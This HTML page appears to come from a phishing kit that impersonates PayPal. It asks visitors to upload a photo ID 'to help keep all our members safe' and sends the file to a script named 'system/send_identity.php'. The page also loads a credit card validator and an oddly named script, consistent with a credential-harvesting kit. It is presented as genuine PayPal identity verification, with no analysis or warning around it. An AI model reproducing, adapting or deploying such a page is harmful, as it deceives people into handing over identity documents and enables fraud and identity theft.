<!DOCTYPE html>
<html>
<head>
  <title>PayPal</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" type="text/css" href="assets/bulma.min.css">
  <link rel="stylesheet" type="text/css" href="assets/style.css">
<link rel="shortcut icon" href="assets/pp_favicon_x.ico" />
</body>
</head>
<body onload="spinner()">
<form action="system/send_identity.php" method="post" enctype="multipart/form-data">
<nav id="nav_desktop">
  <div class="container_desktop">
  <img src="assets/navbar_left.png" alt="" class="navbar_left"><img src="assets/navbar_right.png" alt="" class="navbar_right">
  </div>
</nav>
<nav id="nav_mobile">
  <div class="container_mobile">
  <img src="assets/menu.png" alt="" class="navbar_mobile_left">
  <center><img src="assets/ppl.png" alt="" class="navbar_mobile_center"></center>
  <img src="assets/alert.png" alt="" class="navbar_mobile_right">
  </div>
</nav>
<br><br>
<div id="subnav">
  <div class="container_desktop">
  <img src="assets/hi.png" alt="" class="subnav_left"><img src="assets/payForGood.png" alt="" class="subnav_right">
  </div>
  <div class="hr_two"></div>
</div>
<br><br>

<div class="container_id">
  <div class="panel">
    <h1 class="panel-title">Upload a photo ID</h1>
    <p>To help keep all our members safe, we need to know our community. Please provide a document that verifies your identity.</p><br>
    <center><img src="assets/sample-selfie-card.svg" style="width: 100%;"></center><br>
    <b>What document would you like to upload?</b><br><br>
    <li>Your documents need to be valid and legible.</li>
    <li>The submitted information on the documents must correspond with the information on your PayPal account.</li>
    <li>Your documents shouldn't be older than 6 months.</li>
    <li>We will handle your information in accordance with our <span style="font-weight: 500;color: #0070ba;">Privacy Policy</span></li>
    <br><br>

      <div style="width: 100%;">
        <div class="image-upload">
        <label for="up_file" class="xv">
        <img src="assets/up.png" class="up" alt="" />
        <span class="drag">Drag and drop</span>
        <span class="browse">Browse Files</span>
        <span class="size">JPG GIF PNG PDF | 5 MB each</span>
        </label>

        <input id="up_file" name="up_file" type="file" required/>
        </div>
      </div><br><br>
      <div id="upp">
            <br>
            <p class="up_ns"><span class="uploded_name"></span> (<span class="uploded_size"></span>)</p>
            <img src="assets/trash.png" class="trash" id="trash" alt="">
            <br>
            <hr class="up-hr">
      </div>

    <br>
    <div class="columns is-multiline is-mobile" id="col">
      <div class="column is-12">
        <button name="btn" id="btn">CONTINUE</button>
      </div>
    </div>
  </div>
</div>

<div class="spinner loading" id="spinner" style="display: none;"></div>
<br><br><br><br><br><br><br>
<footer>
  <img src="assets/footer_left.png" alt="" class="footer_left"><br><br>
  <div class="hr"></div>
  <br><br><img src="assets/footer_right.png" alt="" class="footer_right"><img src="assets/footer_mobile.png" alt="" style="display: none;" class="footer_mobile">
</footer>
<script src="https://code.jquery.com/jquery-3.3.1.js"></script>
<script type="text/javascript" src="assets/Xwanted.js"></script>
<script type="text/javascript" src="assets/jquery.creditCardValidator.js"></script>
<script type="text/javascript" src="assets/validator.js"></script>
<script type="text/javascript">
$(document).ready(function(){
    $('#up_file').change(function() {
    var filename = $('#up_file').val();
    if (filename.substring(3,11) == 'fakepath') {
    filename = filename.substring(12);
    }
    $('.uploded_name').html(filename);
    var xz = (this.files[0].size / 1024).toFixed(2)+ " KB";
    $('.uploded_size').html(xz);
    $('#upp').fadeIn(100)
    $("#trash").click(function(){
    $('#upp').fadeOut(100)
    });
    });
});
</script>
</form>
</body>
</html>